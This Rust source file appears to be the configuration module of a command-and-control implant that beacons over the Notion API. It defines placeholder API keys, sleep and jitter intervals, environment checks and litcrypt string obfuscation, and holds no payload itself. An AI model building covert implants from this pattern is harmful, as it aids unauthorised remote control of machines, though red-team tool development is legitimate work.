use std::error::Error;
use std::io::{self, Write};
use std::fs;
use std::fmt;
use serde::{Deserialize, Serialize};
use serde_json::{to_string, from_str};
use base64::encode;
use litcrypt::lc;
use crate::env_check::EnvCheck;

// Config consts
pub const URL_BASE: &str = "https://api.notion.com/v1";
pub const DEFAULT_API_KEY: &str = "<<API_KEY>>";
pub const DEFAULT_PARENT_PAGE_ID: &str = "<<PARENT_PAGE_ID>>";
pub const DEFAULT_SLEEP_INTERVAL: &str = "<<SLEEP>>";
pub const DEFAULT_JITTER_TIME: &str = "<<JITTER>>";
pub const DEFAULT_LAUNCH_APP: &str = "<<LAUNCH_APP>>";
pub const DEFAULT_LOG_LEVEL: &str = "<<LOG_LEVEL>>";
pub const DEFAULT_CONFIG_FILE_PATH: &str = "./cfg.json";
pub const DEFAULT_ENV_CHECKS: &str = "<<ENV_CHECKS>>";

/// Enum for ConfigOptions, useful for parsing configs from 
/// arbitrary data.
#[derive(Debug, Serialize, Deserialize)]
pub enum ConfigOption {
    ApiKey(String),
    ParentPage(String),
    Sleep(u64),
    Jitter(u64),
    LaunchApp(bool),
    ConfigPath(String),
    LogLevel(u64),
    EnvChecks(Vec<EnvCheck>)
}


/// Storing Config Options as a struct for ergonomics.
///
/// * `sleep_interval`: u64 for use with `std::thread::sleep()`
/// * `parent_page_id`: String which eventually can be added at compile
/// * `api_key`: String also added at compile
/// * `config_file_path`: String where the json for config will be read/written
/// * `launch_app`: Whether to launch the Notion web app
/// 
#[derive(Debug, Serialize, Deserialize)]
pub struct ConfigOptions {
    pub api_key: String,
    pub parent_page_id: String,
    pub sleep_interval: u64,
    pub jitter_time: u64,
    pub launch_app: bool,
    pub log_level: u64,
    pub config_file_path: String,
    pub env_checks: Vec<EnvCheck>
}


#[derive(Debug)]
pub struct ConfigError(String);

impl fmt::Display for ConfigError {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        write!(f, "{}", self.0)
    }
}

impl Error for ConfigError {}

impl ConfigOptions {

    /// Produces a base64 encoded String of the Options.
    ///
    /// This is useful for sending ConfigOptions to launch commands
    pub fn to_base64(&self) -> String {
        encode(to_string(self).unwrap().as_bytes())
    }

}

/// Sets default config options from defined constants.
pub async fn get_config_options() -> Result<ConfigOptions, ConfigError> {
    let config_options = ConfigOptions {
        sleep_interval: DEFAULT_SLEEP_INTERVAL.parse().unwrap_or_else(|_| 10),
        jitter_time: DEFAULT_JITTER_TIME.parse().unwrap_or_else(|_| 0),
        parent_page_id: DEFAULT_PARENT_PAGE_ID.to_string(),
        api_key: DEFAULT_API_KEY.to_string(),
        config_file_path: DEFAULT_CONFIG_FILE_PATH.to_string(),
        launch_app: DEFAULT_LAUNCH_APP.parse().unwrap_or_default(),
        log_level: DEFAULT_LOG_LEVEL.parse().unwrap_or_else(|_| 2),
        env_checks: from_str(DEFAULT_ENV_CHECKS).unwrap_or_else(|_| Vec::new())
    };
    
    Ok(config_options)
}

/// Ingests config from a saved JSON file—or tries to.
/// 
/// If `None` is passed as the path, the `DEFAULT_CONFIG_FILE_PATH` is attempted.
/// 
/// If no config file can be parsed, defaults are used.
pub async fn load_config_options(c: Option<&str>) -> Result<ConfigOptions, ConfigError> {

    let config_file_path = match c {
        Some(p) => p,
        None => DEFAULT_CONFIG_FILE_PATH
    };

    if let Ok(c) = fs::read_to_string(config_file_path) {
        if let Ok(cfg ) = from_str::<ConfigOptions>(c.as_str()) {
            Ok(cfg)
        } else {

            // Create ad-hoc encryption since we don't have a logger
            #[cfg(debug_assertions)] {
                let mut err_msg = lc!("[!] Could not convert to JSON: ");
                err_msg.push_str(c.as_str());
                println!("{err_msg}");
            }
            get_config_options().await
        }
    } else {
        get_config_options().await
    }
}
